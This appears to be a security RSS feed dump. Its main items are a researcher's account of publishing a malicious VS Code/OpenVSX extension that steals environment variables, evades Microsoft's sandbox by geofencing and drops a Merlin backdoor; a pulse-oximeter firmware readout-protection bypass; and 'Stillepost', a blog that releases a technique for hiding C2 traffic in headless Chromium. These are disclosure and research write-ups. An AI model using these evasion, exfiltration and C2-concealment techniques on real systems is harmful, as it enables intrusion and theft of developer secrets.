of ) intended to be unique but not too suspicious at first glance. The first version of Piithon-linter was straightforward. It hooked into VS Code’s startup routine so that every time VS Code launches, the extension would quietly exfiltrate the developer’s environment variables and system metadata to a remote server (e.g., a command-and-control server)​. For safety purposes, I set up redaction rules on the extension to redact all secret values on the client before it’s sent - attackers won’t really do that.This is critical because environment variables normally contain developers’ secrets. The VS Code editor inherits all the environment variables of the shell session​ that initiates it. Piithon-linter could steal any secret tokens or keys present in the environment as soon as VS Code launches. If the machine has something like GITHUB_TOKEN or AWS_SECRET_KEY in its env, it is getting sent to the C2 server immediately.This is how it looks for an attacker once VS Code is launched by the affected developer:It’s possible to set the command execution through the  attribute in the extension manifest. That way, even if the user never explicitly uses a command from my extension, my code runs as soon as VS Code opens.The extension was tested locally, and it was time to publish it to the VS Code Marketplace.Publishing Malicious Extension to the VS Code MarketplaceI packaged the VS Code extension as a VSIX file and submitted it to the Visual Studio Code Marketplace, the official one run by Microsoft.Given that the extension is clearly malicious. I expected the publish step to be rejected. There were no encoding, obfuscation, or special features being introduced in the extension; just obviously malicious code.Microsoft’s marketplace documentation states that malware scans (with multiple antivirus engines) on each upload are executed, and it also does dynamic analysis by executing the extension in a sandbox VM​. I figured that the network calls or suspicious strings would flag and break the publishing step.To my surprise, Piithon-linter was accepted in the Visual Studio marketplaces without any issues.The VS Code Marketplace listed it publicly. At this point, any developer could find and install Piithon-linter from the VS Code marketplace, and upon doing so, they’d be installing malware into their VS Code.Open VSX is the marketplace that powers Cursor AI, Windsurf, AWS Kiro, and most AI-Powered IDEs. I also published the Piithon-linter extension to OpenVSX, and it was publicly searchable in Cursor AI, Windsurf, AWS Kiro, and most AI-Powered IDEs.OpenVSX only relies on user reporting and compliance agreements to prevent malicious extensions. The problem is that this does not prevent attackers from distributing malware. It’s unlikely that adversaries would be deterred by a terms-of-service checkbox.Upgrading Piithon-Linter to a Full BackdoorHaving seen the first version sail through the checkpoints, I wanted to see if a fully-functional backdoor could be detected. The first version was a basic info stealer POC. The second version had malware patterns written in clear-text to make it obvious for detection tools to flag this extension as malware, while still giving it the ability to function as a full backdoor.Endpoint security checks Before executing the payload, the extension now scans the system for signs of endpoint security or antivirus software. For example, it looks for processes or services related to popular security products. If it detects an EDR/AV, it stops the execution.To make it simpler for detection, the function responsible for running this check is written with no obfuscation. The naming convention was also set to be simple:Bypassing Microsoft’s Sandbox Scanning with Geofencing Rules One theory that I had is that Microsoft will be running its Sandbox scanning in the United States. To bypass the Sandbox detection, whenever this extension is executed from the United States, it would terminate the execution after sending the environment variables to the C2 server, without deploying and executing an implant.I wasn’t sure if this idea could help, and did not know if the Sandbox environment had egress filtering rules that could block the communication with external network resources.To my surprise, the extension bypassed Microsoft’s sandbox scanning by behaving differently when it was executed in Microsoft’s sandbox. I also got a pingback from a Microsoft Sandbox IP, and it was running from a Microsoft ASN located in the United States.An attacker could utilize this technique to bypass Microsoft’s sandboxing when being vetted on the Microsoft Marketplace.Automated backdoor deployment If all checks passed, piithon-linter would drop a post-exploitation agent onto the machine. I used the open-source Merlin agent, which is a cross-platform command-and-control tool that provides a stealthy remote shell access to the infected machine. I packaged a suitable Merlin binary for each OS (Windows, macOS, and Linux) within the extension. The extension’s code can determine the OS at runtime (process.platform) and will execute the appropriate payload accordingly​.For safety purposes, the agent was set not to connect to an external server, as this is purely done for research. I did not attempt to publish a version that would connect back to an external server or gain access to developers’ machines.I also pushed the latest version to VirusTotal, and it was not flagged by any security vendors on VirusTotal:I updated the extension in the VS Code Marketplace with this new version. And again, it went through the publication process without any flags. The evasion measures worked: the static code was now even more obviously malicious, yet still no static scanner alerts. The dynamic analysis likely didn’t see anything because I kept the Azure and sandbox detection in place.I tested the final malicious extension on a few machines with different security products running, and none of the endpoint security solutions I tried (which were well-known EDR/AV products) raised an alert when the extension executed and launched the backdoor​.Gaining Persistence via VS Code Because VS Code itself auto-launches my extension on startup, the backdoor is persistent. Even if the user reboots, as long as they open VS Code, the Piithon-linter malicious extension would run again and ensure the access remains. Also, VS Code by default will auto-update extensions, which means an attacker can push updates with new functionalities at any time, and they’ll be pulled down to all installed instances​.I have disclosed my findings to Microsoft and Open VSX (the marketplace that is being used by Cursor AI, Windsurf, AWS Kiro, and other VS Code forks). I have also shared the Open VSX findings with Cursor AI.Microsoft received my responsible disclosure, and assessed it as the following:After careful investigation, this case has been assessed as low severity and does not meet MSRC’s bar for immediate servicing due to:There will be ways to bypass static analysis checks that are put in place to detect the problematic code. Therefore, it is the user’s responsibility to ensure that they are not installing malicious extensions.I do not expect Microsoft to be resolving any of my findings within this research. All attack vectors mentioned here are available to adversaries to use and to bypass Microsoft VSCode Marketplace security controls.The Eclipse Foundation, the maintainer of Open VSX is a non-profit organization. The Open VSX marketplace is a free and open-source marketplace. The Eclipse Foundation shared that they’re going to implement security controls to detect and prevent malicious extensions. As the Eclipse Foundation being a non-profit organization providing Open VSX for free to all Cursor AI and other AI-powered IDEs, they need support from their companies.The Cursor Security team shared that they’ve rolled out new security features for users (built on top of Open VSX).- Do additional publisher verification- Changed the order Cursor presents extensions to further highlight legitimate ones- Integrated malware scanning on our sideI tried testing the malware scanning on Cursor AI and it still marked the piithon-linter extension as safe.I created a “piiithon-linter”, a full exploit that triggers a full exploitation with anyone installing the extension.Whenever anyone installs the malicious extension, or launches VS Code or Cursor AI after the malicious extension is installed, you will get access to the developer’s machine through the Merlin framework. It also works on Windows, macOS, and Linux.This project revealed something I didn’t fully expect going in: publishing a malicious VS Code or OpenVSX extension capable of compromising developer environments is shockingly easy. The entire process required no advanced evasion, no obfuscation, and no tricks that would be out of reach for a motivated attacker. The current security controls simply aren’t enough to catch malicious extensions.Microsoft’s sandbox analysis and antivirus checks can be bypassed with simple evasion techniques. OpenVSX, meanwhile, performs virtually no security screening at all.The implications are serious. Developers aren’t just ordinary users; they sit at the heart of the software supply chain. They hold the keys to source code, infrastructure, and production systems. Compromising even one developer’s IDE could quietly open doors into an entire organization.The core business of Cursor AI, WindSurf, and most AI-powered IDEs revolves around supporting developers. Relying on an open-source marketplace without adding additional security checks is a risk that needs to change.If there’s one takeaway from this research, it’s that the next big supply chain compromise could be from the editor we use every day.You can download the slides of my Black Hat talk from here:]]></content:encoded></item><item><title>ISC Stormcast For Monday, December 8th, 2025 https://isc.sans.edu/podcastdetail/9728, (Mon, Dec 8th)</title><link>https://isc.sans.edu/diary/rss/32546</link><author></author><category>threatintel</category><pubDate>Mon, 8 Dec 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>When the Digital World Turns Physical: The Expanding Role of Threat Intelligence in Executive Protection</title><link>https://www.recordedfuture.com/blog/digital-world-turns-physical-expanding-role-threat-intelligence-executive-protection</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_12954aecdae677b3bfd16a2b689442a79b95f4b83.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Mon, 8 Dec 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Critical React2Shell Vulnerability Under Active Exploitation by Chinese Threat Actors</title><link>https://www.recordedfuture.com/blog/critical-react2shell-vulnerability</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1abb944bea932ffe338341ee3bf2fc57346f3d3e6.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Mon, 8 Dec 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[Last updated on 9 December.A critical vulnerability in React Server Components is allegedly being actively exploited by multiple Chinese threat actors, Recorded Future recommends organizations patch their systems immediately.CVE-2025-55182, dubbed "React2Shell," affects React Server Components versions 19.0, 19.1.0, 19.1.1, and 19.2.0 in several Meta packages. Amazon's AWS Threat Intelligence team reported on December 4 that Chinese threat groups including Earth Lamia, Jackpot Panda, and several untracked clusters are actively exploiting this vulnerability. However, AWS has not provided any further evidence for these attributions beyond IP addresses allegedly used by these threat groups. At this stage, Insikt Group cannot exclude the possibility that the same threat group might still be using the IP address 206[.]237[.]3[.]150, but we are currently unable to verify AWS’s attribution to Earth Lamia.The vulnerability stems from unsafe payload deserialization at React Server Function endpoints.

        consumer-grade pulse oximeters. These devices clip onto your finger and
        shine a light through it. By analyzing the light transmitted through
        your finger, the device can infer your pulse and blood oxygen
        saturation.In this project, I specifically looked at the 
        Beurer PO 80. This is a German-engineered medical device (according
        to the box) for less than $100 at reputable resellers. It has a USB
        port for connecting to a PC to view pulse and SpO2 in real-time and to
        download previously recorded data.These pulse oximeters are compatible with the free “SpO2 Assistant”
        software. This software seems to support a variety of different pulse
        oximeter models. It plots pulse and SpO2 data in real time, allows for
        exporting recorded data, and lets you configure some basic settings of
        the pulse oximeter like patient name (no idea why this would be
        necessary) or the current date and time.First, I unpacked the SpO2 Assistant software and loaded it into
        Ghidra. My initial plan was to reverse-engineer the custom USB HID
        protocol that the Beurer PO 80 seems to use. Quickly, I stumbled upon
        embedded strings and a logo that makes me question the “German
        engineering” claim. But to be fair, the software was technically not
        part of the pulse oximeter itself.I soon realized that static decompilation is probably not the most
        effective way to understand the USB HID protocol. Instead, I connected
        the pulse oximeter and used a protocol sniffer to eavesdrop on the
        communication between device and PC software.With this dynamic analysis method and some trial-and-error, I was
        able to partly reverse-engineer the protocol. I wrote a Python tool
        that can initialize and fetch pulse and SpO2 data from the Beurer PO
        80.As a next step, I took the pulse oximeter apart. It disassembles
        nicely without any screws or glue. The build quality is definitely not
        outstanding, but not surprising at this price. You can find
        suspiciously similar devices for less than $10 on Aliexpress.The device has a 240 x 240 color display and a user button on the
        front side. The main microcontroller is a GigaDevice GD32F350RBT6, a
        108 MHz, Arm Cortex-M4 core with 128 kB flash and 16 kB SRAM.
        Additionally, there is a serial flash memory chip for recording data.
        An accelerometer detects the current orientation and rotates the
        display accordingly. There is also room for a Bluetooth module that is
        not populated on the USB-only PO 80.Conveniently, there is a debug connector that exposes the SWD debug
        interface of the microcontroller. With this, I was hoping to dump the
        firmware for further analysis.Bypassing Flash Readout ProtectionAfter connecting a debug probe, the device was successfully
        detected, but I could not dump the firmware. The device had “low-level
        protection” mode enabled. While in this mode, SRAM and memory-mapped
        peripherals can be read through the debugger, but read-out of flash is
        prohibited; only code can access flash. Also, boot from SRAM is
        disabled in this mode, to prevent loading a flash dumper directly into
        SRAM.I used a 
        known hardware vulnerability of these microcontrollers to bypass
        the read-out protection. The die revisions used in my device were still
        vulnerable. Huge thanks to a1exdandy, the author of the original
        research, for publishing the blog post and helping me get his exploit
        to work.With this exploit, I could successfully dump the firmware of the
        device. Due to the nature of the exploit, the chip had to be completely
        bricked during this process, i.e., the SWD debug port had to be
        completely disabled. This, however, is not a problem. I can just buy a
        new microcontroller, flash the original firmware that I just dumped,
        and now I have a fully unlocked development device.As a side note: replacing the chip took longer than expected. I
        accidentally ordered a GD32F350R8T6, instead of the GD32F350RBT6 that
        was in the device originally. These two types differ in their flash
        sizes: 64 kB vs 128 kB. Don’t ask me why GigaDevice thought this naming
        scheme and this font was a good idea. I only realized my mistake after
        a few hours of debugging, where I noticed that only half of the
        firmware would be flashed correctly. After reordering the correct type,
        my pulse oximeter was working again.After resurrecting the device, connecting GDB and stepping through
        the code still did not work as smoothly as expected. This was mainly
        due to two things: First, the firmware would automatically enable low
        level protection again at run time. Hence, the microcontroller can only
        be debugged once. Second, the device would enter a sleep mode after a
        few seconds of inactivity, even if a debugger was connected. By
        searching for references to the option byte control register, I quickly
        identified the following snippet in the firmware:By cross-referencing with the datasheet, you can see that this
        indeed enables low-level protection.By changing 0xBB to 0xA5 in a hex editor, I was able to successfully
        patch out this protection mechanism; the microcontroller would now stay
        unlocked indefinitely.Similarly, I was able to resolve the second problem by patching out
        the watchdog configuration and the deep-sleep enter (
        instruction).Next, I wanted to access the display. While I could reverse-engineer
        the PCB layout and rewrite the firmware from scratch, I wanted to reuse
        as much of the original firmware as possible.To identify code that is responsible for accessing the display
        (there are no symbols or debug messages in the binary), I started the
        pulse oximeter and interrupted it with a debugger while it was
        displaying a splash screen. From there, I could backtrack and identify
        the relevant function.This function essentially looks like this:i.e., it can display an arbitrary-sized buffer at an arbitrary
        location on the display. To display the Doom splash screen, I patched
        the image data into an unused section of the flash memory. Instead of
        manipulating the function call in the binary (which can be a bit
        tricky), I used the following GDB script to dynamically patch the
        buffer address on the stack at run time, right before the
         function call.While this allows me to draw anything I want on the display, it is
        not actually running Doom yet. For this, I would probably have to start
        using a compiler instead of only a hex editor.Since I can freely program, patch, and debug the microcontroller
        firmware, this is definitely doable. However, I think it would be more
        interesting to leverage this level of access for further investigation
        of the existing firmware, e.g., to look for exploitable memory
        corruption vulnerabilities. It would be really cool if, e.g., a buffer
        overflow in the custom USB HID protocol could be used to gain code
        execution without physical access to the device.Please reach out if you would like to contribute to this challenge.
        I may follow-up with this project in the future, but for now, I will
        focus on other things. Thanks again a1exdandy for the help with
        bypassing the GD32 readout protection and others for their help and
        advice.]]></content:encoded></item><item><title>Portugal updates cybercrime law to exempt security researchers</title><link>https://databreaches.net/2025/12/07/portugal-updates-cybercrime-law-to-exempt-security-researchers/?pk_campaign=feed&amp;pk_kwd=portugal-updates-cybercrime-law-to-exempt-security-researchers</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 7 Dec 2025 15:51:51 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>LockBit 5’s “new secure blog domain” infra leaked already</title><link>https://databreaches.net/2025/12/07/lockbit-5s-new-secure-blog-domain-infra-leaked-already/?pk_campaign=feed&amp;pk_kwd=lockbit-5s-new-secure-blog-domain-infra-leaked-already</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 7 Dec 2025 12:16:55 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>NL: Nuenen accidentally leaks addresses of 1,000 asylum center opponents</title><link>https://databreaches.net/2025/12/07/nl-nuenen-accidentally-leaks-addresses-of-1000-asylum-center-opponents/?pk_campaign=feed&amp;pk_kwd=nl-nuenen-accidentally-leaks-addresses-of-1000-asylum-center-opponents</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 7 Dec 2025 12:01:08 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Stillepost - Or: How to Proxy your C2s HTTP-Traffic through Chromium | mischief</title><link>https://x90x90.dev/posts/stillepost/</link><author>/u/S3cur3Th1sSh1t</author><category>netsec</category><pubDate>Sun, 7 Dec 2025 07:32:47 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[I was recently stepping into the topic of dumping cookies from different browsers while looking for new modules for my personal C2 project. While reading about different techniques that do this, I found tools such as WhiteChocolateMacademiaNut that utilize the Chrome DevTools Protocol (CDP for short). This approach stood out to me because, unlike other techniques, it avoids direct file reads or hooking and instead relies on a legitimate feature used in its intended manner to achieve the malicious goal. And that made me wonder: how else could this Chrome DevTools Protocol be handy to an attacker? Which brings us to this blog post and tool release.In this post I introduce you to the Chrome DevTools Protocol, the idea it sparked while I was reading through its documentation, and the path from that idea to a working implementation. After reading this blog post, you should be able to utilize stillepost in your own projects to send HTTP-requests over Chromium based browsers.The  allows for tools to instrument, inspect, debug and profile Chromium, Chrome and other Blink-based browsers. Many existing projects currently use the protocol. The Chrome DevTools uses this protocol and the team maintains its API.Instrumentation is divided into a number of domains (DOM, Debugger, Network etc.). Each domain defines a number of commands it supports and events it generates. Both commands and events are serialized JSON objects of a fixed structure.To be able to use the CDP, you first have to spawn a chrome instance with the  command line flag. If you set this flag to  chrome will generate a random port number for you over which you can access the CDP-server. If you don’t like randomness and want to have a bit more control in your life, you can also just specify any port number (of course the port has to be available).After spawning the Browser and letting it spin up the CDP-server you can connect to it via a WebSocket URL. This WebSocket URL is obtainable via two ways:The URL gets printed to STDERR of the browser process and be read from there.By reading it from http://127.0.0.1:<debugPort>/json/listIf you choose the second approach, a GET request to the mentioned endpoint will give you a response similar to this, which you can parse to retrieve any :Once connected to the WebSocket, the Chrome DevTools Protocol mainly uses JSONRPC requests to issue different commands. Each command request consists of a JavaScript struct with an , a  and  which contains whatever arguments you want/need to pass to the method.An example for a command to take a screenshot of the current page:Now that I have explained the basics of the core technology behind this, let’s dive into how we can “abuse” this.Now What ¯\_(ツ)_/¯? The Base IdeaThe CDP gives us access to the base functionality of the browser.
We can for example:read and write to the DOM of open tabsget information about the hostaccess the browser storageBut I asked myself: with this level of access to the browsers functionality, what do browsers have that malicious implants might lack?And the first idea that came to me was: expected network traffic to random websites and endpoints.If we land on a user workstation, we’d expect the company to allow their employees to be able to use a browser to navigate the web. This means, the browser should be configured with the correct proxy configuration (or use the system proxy config), have the necessary firewall whitelisting for port 443 and additionally traffic coming from chrome/edge/browser should be expected.This in my head would be ideal for situations where a phishing payload uses a side-loading approach to run your implant inside some arbitrary signed binary. If the implant can proxy its traffic through the user’s browser, you avoid any odd outbound traffic coming directly from the side-loaded binary itself (other than a localhost connection), and you don’t have to worry about making the implant proxy-aware. And because this is part of a phishing campaign, you can assume it lands on a machine the user actually works on every day, which means the browser is very likely to be set up and usable.So is there any way we can trigger arbitrary requests using the Chrome DevTools Protocol?
The short answer of course is: yes. Otherwise this blog post wouldn’t have made much sense I guess…My first idea was to utilize the  domain, but after looking at its description and available function it actually didn’t seem to be the right fit, as at a first glance it doesn’t provide functions that would allow us to send arbitrary data to arbitrary URLs:My next idea was a bit more “hacky”. If we can control the DOM of opened pages, what if we inject some arbitrary JavaScript-Code into it that’ll trigger an XHR request? That way we could control the target URL, the data and even some of the headers we use.
But: this would likely limit us to the CSP of the page we open, which might limit inline JavaScript execution.This method would allow us to directly  any JavaScript-code and to get its return value as a response.So if we write a JavaScript function that takes a URL, some data, and a set of headers, and fires off the request through XHR, we can, in theory, hand back an object with the response. At that point the main goal of the whole project would be achieved. So let’s get to it.Given the current information, the base workflow of the PoC would have to be:Spawn a Chromium browser with the necessary argument flagsParse a JavaScript template and insert the necessary info (method, target URL, data, headers)Collect the WebSocket URL and connect to itIssue the  command with the JS templateBefore we can spawn the browser, we need to know and prepare some variables.
This includes:what user-profile the browser should usewhat debugging port the CDP server will listen onIn the code of the stillepost library, this is all implemented as part of the exposed function  which has the following function signature:The first argument , whose use-case should be quite obvious, is the path to the chromium based browser executable. If this argument is set to  a default path for edge will be used (C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe).Other chromium based browser, you could probably use, are:Chromium (who would’ve thought)The second argument  is the debug port the CDP server will listen on. If this is set to  the code will mimic the behavior of the browser and randomly generate one.Now the third argument  is the profile the browser instance will use. You could either specify the path to a profile folder or the name of a profile. If you set this argument to  stillepost will generate and create a temporary folder which will be deleted by the cleanup function of stillepost.I prefer this tool to work with a clean slate for every run, so a newly generated temporary profile is the default ( being passed as the value). I don’t think XHR-requests would show up in the history of the user-profile but I think creating a folder and deleting it later on is better than risking tainting an existing user profile with potentially something. If you have some knowledge about effects using an existing profile would have, let me know!Once the arguments and environment for the browser are set, the function then continues to actually spawn the browser.Actually starting the process isn’t that wild as it’s just a call to  with the command line flags.Author’s Note: When I developed the technique, I added a small evasion mechanism at this stage to complicate detection, based on patterns I had encountered in existing rules for similar techniques (would be nice if we could trigger process creation without the initial arguments…). I chose not to include this code in the public release. I think the underlying concept is clear without it, and publishing the “evasive” implementation would, in my opinion, only lower the barrier for unskilled actors.
I initially intended to describe the mechanism briefly here, which is why the browser-spawning step became its own section in the post, but that left the section somewhat empty. Sorry for that.Besides the environment info, like the debug port and what profile to use, we also specify that the browser should be started in headless-mode. This will tell the browser to not spawn a window for the process. This is obviously necessary to not show the user that something is going on, but has the side effect that the browser will try to attach itself to the console of our own process. You could potentially evade this, but I decided it’s not worth the effort for the PoC and instead decided to just limit logging to a minimal, which explains the remaining command line arguments passed to the browser.Fetching the WebSocket URLAfter spawning the browser, we need to know the WebSocket URL, in order to be able to send commands to it.If you remember in the beginning I explained two approaches to do this.
In this project I decided to implement approach number two, by sending a  request to the URL http://127.0.0.1:<debugPort>/json/list and parsing its response.The code for this is located in the function get_websocket_debugger_url which gets called internally by .
The approach is quite simple to implement using WinHTTP and cJSON, so I wont go into it to deep.After sending the -request, parsing the response is as easy as the following code, using the cJSON library:Knowing where to contact the CDP server via the WebSocket URL is all good and fun, but so far we don’t even know what to execute once we connect to it. Let’s fix that!I’m gonna be honest… I really don’t like JavaScript. And because of that I’m literal trash at writing it (besides some basic XSS PoC to get some CSRF-token and execute some task as the target user). And that’s why my JavaScript template that we use to actually trigger the XHR request to a remote endpoint was generated by AI. Please don’t come at me with your pitch-forks and torches.So I prompted ChatGPT to come up with some JavaScript function that triggers an XHR request and returns a JSON object containing the response status code, all response headers and the body of the response. After explaining what arguments the function should take and modifying the result a bit, I had the following code:In JavaScript the function can/should be called like this:As you can see, the JS function takes four arguments: the request method, the target URL, a string of a JSON object that defines what headers to add to the request and finally a string of a JSON object of parameters and their values.If the chosen method is either  or  the JavaScript function will parse the parameter object and append them with their values to the URL. For other requests we’ll let  handle the parsing of the data.As for the response, the JavaScript code will build a JSON object and return it’s stringified version:I modified the JavaScript code to additionally directly include a call to the function with placeholder arguments, that can be  easily be replaced with actual values for the request later on:So when we want to eval the code in the browser, we first have to replace each argument with its corresponding value.With the browser and CDP server running, the template standing strong and stillepost knowing what WebSocket URL to use, the only thing left is to actually trigger the command via a Chrome DevTool Protocol request.Now before I explain how the code actually sends the request and parses the response, I think it’s time to show you an example on how to use the three main functions of the  library.The following code shows you how your implant could utilize stillepost. The code includes , which exposes the functions , ,  and , and uses them to send a  request to a webserver listening on http://192.168.157.133:8000:So far I have mainly described things that happen in  (preparing the environment, starting the browser and getting the WebSocket URL). Now we’ll take a brief look into the main function  to understand how we can use the CDP to proxy HTTP-requests through chromium based browser.The function first starts by building the actual JavaScript payload, by replacing the placeholder values in our template with the passed arguments:After the template has been parsed, we build the actual DevTools protocol JSON message, which includes the method () and its arguments (our parsed JS template stored in ).We also say that we’ll wait until the eval returns some data, which is necessary since otherwise the function would return before the asynchronous request could’ve been parsed.With the final JSONRPC message being built, we can now continue on and send it to the WebSocket endpoint. The response will be read into a dynamic buffer and can take some time, depending on the response time of the remote server.When the response has been received,  will prepare a  struct to return. The definition of the type is as follows:With the returned struct we should be back in our  function that called  and we can continue to parse the response.
If the return value is  something went wrong and you can call  to get the error code to cross check what went wrong.Running the above implant usage example utilizing stillepost we would get the following output:Note that since the example is a console application edge connected to our console and printed the WebSocket URL it created.This is how the received  request looks like to the target webserver:To send the same request (same data & headers), but as a  request, we just change the call to :stillepost("GET", "http://192.168.157.133:8000/", cjsonpHttpHeaders, cjsonpData)
And the request to the webserver would become the following:At the end of the program we need to make sure to cleanup. This includes killing the spawned browser, removing the temporary profile folder (if created) and of course freeing any allocated memory.The function  does all that and doesn’t require any input arguments. Resources owned by main still need freeing (duh).Limitations of the TechniqueThis technique only works when the target web-server allows for CORS requests from arbitrary origins. So make sure when using stillepost that your redirector has CORS configured to allow exactly that. While testing the technique I used a python webserver that explicitly set the following headers:Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
This is also the reason, why you won’t necessarily be able to send arbitrary requests to other web pages in the context of the user. If the target pages don’t allow CORS requests, the browser will drop/block the request attempt.I’m not sure how and if I’ll update this technique, so for now take it as-is.
This proof of concept had the goal of sending HTTP traffic via the browser, since this is the protocol my own C2 uses most of the times. In theory you could probably write a custom protocol handler in JavaScript for other types of traffic, so if you have the motivation or prompting skills maybe that would be a cool addition (though I’m not sure that seeing a browser doing SMB traffic to arbitrary locations would benefit the point of removing IoCs).I hope this blog post was informative about some other, maybe not so well known, risks of the Chrome DevTools Protocol.
I’m sure there is more mischief that can be done with it and I might take another look at it some time. For now I hope you enjoyed my first ever blog post. If you have any feedback I’d be more than happy to hear it.Thanks for reading, and I wish you a pleasant day!]]></content:encoded></item></channel></rss>
